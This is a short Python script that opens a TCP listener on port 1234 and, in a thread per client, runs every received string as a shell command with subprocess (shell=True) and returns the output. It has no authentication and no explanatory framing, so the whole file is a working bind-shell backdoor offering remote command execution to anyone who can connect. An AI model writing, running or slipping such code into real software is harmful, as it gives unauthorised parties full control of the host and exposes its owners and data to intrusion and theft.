#!/usr/bin/env python3

import socket
import threading
import subprocess

PORT = 1234
connections = []

def handler(conn):
    global connections
    while True:
        raw = conn.recv(4096)
        send = subprocess.check_output(raw, shell=True)
        print ("result = {}".format(send))
        conn.send(send)

def listen(PORT):
    global connections
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", PORT))
        s.listen(32)
        while True:
            conn, address = s.accept()
            connections.append(conn)
            print (connections)
            handlerThread = threading.Thread(target=handler, args=(conn,))
            handlerThread.start()

def _exit():
    exit()

listenThread = threading.Thread(target=listen, args=(PORT,))
listenThread.start()

try:
    var = input()
except KeyboardInterrupt:
    _exit()
except OSError:
    pass
